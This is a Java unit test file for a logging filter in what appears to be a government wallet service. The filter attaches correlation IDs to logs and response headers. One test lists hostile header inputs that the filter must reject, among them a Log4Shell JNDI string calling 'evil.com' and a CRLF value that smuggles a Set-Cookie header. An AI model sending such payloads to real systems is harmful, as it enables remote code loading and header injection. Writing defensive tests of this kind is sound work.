// SPDX-FileCopyrightText: 2026 Digg - Agency for Digital Government
//
// SPDX-License-Identifier: EUPL-1.2

package se.digg.wallet.provider.application.config;

import jakarta.servlet.ServletException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.slf4j.MDC;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.mock.web.MockFilterChain;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Stream;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.matchesPattern;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.doAnswer;

@ExtendWith({
    MockitoExtension.class
})
@SpringBootTest
public class LoggingFilterTest {

  @Autowired
  private LoggingContextFilter filter;

  @Mock
  private MockFilterChain filterChain;

  private static final String UUID_REGEX =
      "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}";
  private static final String CORRELATION_ID_HEADER = "X-Correlation-Id";
  private static final String CORRELATION_ID = "correlationId";

  @BeforeEach
  void clearMdc() {
    MDC.clear();
  }

  @Test
  void adds_generated_correlation_id_to_MDC_when_not_provided_in_header()
      throws IOException, ServletException {

    var httpServletRequest = new MockHttpServletRequest("GET", "/test");

    var capturedRequestId = new AtomicReference<String>();
    doAnswer(_ -> {
      capturedRequestId.set(MDC.get(CORRELATION_ID));
      return null;
    }).when(filterChain).doFilter(any(), any());

    filter.doFilterInternal(httpServletRequest, new MockHttpServletResponse(), filterChain);

    assertThat(capturedRequestId.get(), matchesPattern(UUID_REGEX));
  }

  @Test
  void adds_provided_correlation_id_to_MDC_when_safe()
      throws IOException, ServletException {

    String id = "abz-129_ABZ";

    var httpServletRequest = new MockHttpServletRequest("GET", "/test");
    httpServletRequest.addHeader(CORRELATION_ID_HEADER, id);

    var capturedId = new AtomicReference<String>();
    doAnswer(_ -> {
      capturedId.set(MDC.get(CORRELATION_ID));
      return null;
    }).when(filterChain).doFilter(any(), any());

    filter.doFilterInternal(httpServletRequest, new MockHttpServletResponse(), filterChain);

    assertEquals(id, capturedId.get(), "Id provided in header was not used");
  }

  @Test
  void adds_correlation_id_to_response_headers()
      throws IOException, ServletException {

    String id = "abz-129_ABZ";

    var httpServletRequest = new MockHttpServletRequest("GET", "/test");
    httpServletRequest.addHeader(CORRELATION_ID_HEADER, id);
    var response = new MockHttpServletResponse();
    filter.doFilterInternal(httpServletRequest, response, filterChain);

    assertEquals(List.of(id), response.getHeaders(CORRELATION_ID_HEADER));
  }

  static Stream<String> maliciousHeaderValues() {
    return Stream.of(
        "line\rbreak",
        "line\nbreak",
        "cookie injection\r\nSet-Cookie: evil=1",
        "malicious\\slash",
        "<html>fake html body</html>",
        "semi;colon",
        "<html>fake body</html>",
        "abc\u001b[31mFAKE RED TEXT\u001b[0m", // ANSI poison
        "      ",
        "a".repeat(50) + "!", // regex poison
        "${jndi:ldap://evil.com/x}", // log4shell
        "a\u0008\u0008\u0008\u0008backspace injection",
        "abc\u0000hidden",
        "a".repeat(10_000));
  }

  @ParameterizedTest
  @MethodSource("maliciousHeaderValues")
  void adds_generated_correlation_id_to_MDC_when_provided_id_is_unsafe(String header)
      throws IOException, ServletException {

    var httpServletRequest = new MockHttpServletRequest("GET", "/test");
    httpServletRequest.addHeader(CORRELATION_ID_HEADER, header);

    var capturedId = new AtomicReference<String>();
    doAnswer(_ -> {
      capturedId.set(MDC.get(CORRELATION_ID));
      return null;
    }).when(filterChain).doFilter(any(), any());

    filter.doFilterInternal(httpServletRequest, new MockHttpServletResponse(), filterChain);

    assertThat(capturedId.get(), matchesPattern(UUID_REGEX));
  }

  @Test
  void clears_MDC_when_exception_is_thrown() throws IOException, ServletException {
    var httpServletRequest = new MockHttpServletRequest("GET", "/test");
    var httpServletResponse = new MockHttpServletResponse();

    var capturedId = new AtomicReference<String>();
    doAnswer(_ -> {
      capturedId.set(MDC.get(CORRELATION_ID));
      throw new ServletException("downstream failure");
    }).when(filterChain).doFilter(any(), any());

    try {
      filter.doFilterInternal(httpServletRequest, httpServletResponse, filterChain);
    } catch (Exception ignored) {
    }

    assertThat(capturedId.get(), matchesPattern(UUID_REGEX));
    assertNull(MDC.get(CORRELATION_ID));
  }

  @Test
  void clears_MDC_when_finished() throws IOException, ServletException {
    var httpServletRequest = new MockHttpServletRequest("GET", "/test");
    var httpServletResponse = new MockHttpServletResponse();

    var capturedId = new AtomicReference<String>();
    doAnswer(_ -> {
      capturedId.set(MDC.get(CORRELATION_ID));
      return null;
    }).when(filterChain).doFilter(any(), any());

    filter.doFilterInternal(httpServletRequest, httpServletResponse, filterChain);

    assertThat(capturedId.get(), matchesPattern(UUID_REGEX));
    assertNull(MDC.get(CORRELATION_ID));
  }

}
